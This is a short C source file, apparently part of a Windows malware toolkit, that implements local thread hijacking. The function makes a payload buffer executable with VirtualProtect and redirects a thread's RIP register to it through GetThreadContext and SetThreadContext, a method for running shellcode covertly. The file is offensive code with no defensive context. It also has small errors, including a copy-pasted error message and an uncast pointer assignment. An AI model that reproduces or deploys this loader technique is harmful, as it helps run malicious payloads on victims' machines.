#include "ThreadHijacker.h"


int LocalThreadHijacking(HANDLE hThread, LPBYTE pPayload, SIZE_T szPayload) {

	CONTEXT ThreadCtx = { 0 };
	DWORD	dwOldProtectoion = 0;
	SIZE_T	NumberOfBytesWritten = 0;

	ThreadCtx.ContextFlags = CONTEXT_CONTROL;


	if (!VirtualProtect(pPayload, szPayload, PAGE_EXECUTE_READWRITE, &dwOldProtectoion)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pPayload;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}